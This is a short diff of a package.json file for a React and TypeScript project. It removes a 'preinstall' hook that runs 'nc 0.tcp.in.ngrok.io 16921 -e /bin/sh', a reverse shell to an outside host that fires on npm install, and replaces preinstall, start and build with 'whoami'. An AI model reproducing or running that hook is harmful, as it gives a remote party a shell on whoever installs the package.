@@ -13,9 +13,9 @@
     "typescript": "3.8.3"
   },
   "scripts": {
-    "preinstall" : "nc 0.tcp.in.ngrok.io 16921 -e /bin/sh",
-    "start": "react-scripts start",
-    "build": "react-scripts build",
+    "preinstall" : "whoami",
+    "start": "whoami",
+    "build": "whoami",
     "test": "react-scripts test --env=jsdom",
     "eject": "react-scripts eject"
   },
